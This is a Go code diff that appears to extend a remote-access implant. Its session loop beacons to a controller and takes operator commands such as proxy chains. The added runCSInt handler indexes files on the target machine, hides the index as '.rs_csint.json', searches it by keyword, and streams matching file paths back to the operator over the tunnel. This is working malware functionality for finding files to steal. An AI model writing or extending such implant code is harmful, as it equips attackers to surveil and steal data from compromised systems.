@@ -352,6 +352,12 @@ func runSession(host string, port int, agentID, caFP string, beaconSec int) erro
 				continue
 			}
 			go runProxyChain(conn, sess, pc)
+		case proto.TypeCSIntStart:
+			var c proto.CSIntStart
+			if err := json.Unmarshal(env.Payload, &c); err != nil {
+				continue
+			}
+			go runCSInt(conn, sess, c)
 		case proto.TypeWirelessStop:
 			var ws proto.WirelessStop
 			if err := json.Unmarshal(env.Payload, &ws); err != nil {
@@ -2215,4 +2221,64 @@ func itoa(n int) string {
 		n /= 10
 	}
 	return string(buf[i:])
+}
+
+// runCSInt drives the content-source intelligence operations.
+func runCSInt(conn net.Conn, sess *crypto.Session, c proto.CSIntStart) {
+	send := func(d proto.CSIntData) {
+		d.SessionID = c.SessionID
+		d.Action = c.Action
+		sendTunnelAck(conn, sess, proto.TypeCSIntData, d)
+	}
+
+	switch c.Action {
+	case "index":
+		idx, err := recon2.BuildIndex(c.Root, recon2.BuildIndexOptions{
+			MaxFileSize: c.MaxSize,
+			Extensions:  c.Extensions,
+			SkipDirs:    c.SkipDirs,
+		})
+		if err != nil {
+			send(proto.CSIntData{Error: err.Error(), Done: true})
+			return
+		}
+		send(proto.CSIntData{Docs: len(idx.Docs), Done: false})
+		// write the index next to the root
+		outPath := c.Root + "/.rs_csint.json"
+		if err := idx.Save(outPath); err != nil {
+			send(proto.CSIntData{Error: err.Error(), Done: true})
+			return
+		}
+		send(proto.CSIntData{Path: outPath, Docs: len(idx.Docs), Done: true})
+
+	case "search":
+		idxPath := c.IndexPath
+		if idxPath == "" {
+			idxPath = c.Root + "/.rs_csint.json"
+		}
+		idx, err := recon2.Load(idxPath)
+		if err != nil {
+			send(proto.CSIntData{Error: err.Error(), Done: true})
+			return
+		}
+		hits := idx.Search(c.Query)
+		for _, h := range hits {
+			send(proto.CSIntData{Path: h.Path, Score: h.Score, Terms: h.Terms, Done: false})
+		}
+		send(proto.CSIntData{Done: true})
+
+	case "list":
+		idx, err := recon2.Load(c.IndexPath)
+		if err != nil {
+			send(proto.CSIntData{Error: err.Error(), Done: true})
+			return
+		}
+		for p, d := range idx.Docs {
+			send(proto.CSIntData{Path: p, Docs: len(d.Tokens), Done: false})
+		}
+		send(proto.CSIntData{Done: true})
+
+	default:
+		send(proto.CSIntData{Error: "unknown action: " + c.Action, Done: true})
+	}
 }
